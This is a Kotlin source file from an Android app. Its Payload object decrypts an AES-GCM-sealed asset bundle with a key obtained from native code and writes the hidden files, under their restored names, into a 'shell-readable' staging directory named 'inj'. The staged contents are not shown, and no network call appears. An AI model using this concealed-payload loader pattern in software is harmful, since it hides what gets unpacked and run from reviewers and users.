package com.pc5.android

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.security.MessageDigest
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object Payload {

    /** Unseals assets/raw1/p.bin into a shell-readable staging dir, real names restored. */
    fun stage(ctx: Context): List<File> {
        val stage = File(ctx.getExternalFilesDir(null), "inj")
        stage.deleteRecursively()
        stage.mkdirs()

        val aes = SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(Native.key()), "AES")

        fun open(blob: ByteArray): ByteArray {
            val iv = blob.copyOfRange(0, 12)
            val c = Cipher.getInstance("AES/GCM/NoPadding")
            c.init(Cipher.DECRYPT_MODE, aes, GCMParameterSpec(128, iv))
            return c.doFinal(blob.copyOfRange(12, blob.size))
        }

        val index = JSONObject(String(open(ctx.assets.open("raw1/p.bin").readBytes())))
        val out = mutableListOf<File>()

        for (name in index.keys()) {
            val bytes = open(Base64.getDecoder().decode(index.getString(name)))
            val f = File(stage, name)
            f.parentFile?.mkdirs()
            f.writeBytes(bytes)
            out += f
        }
        return out
    }
}
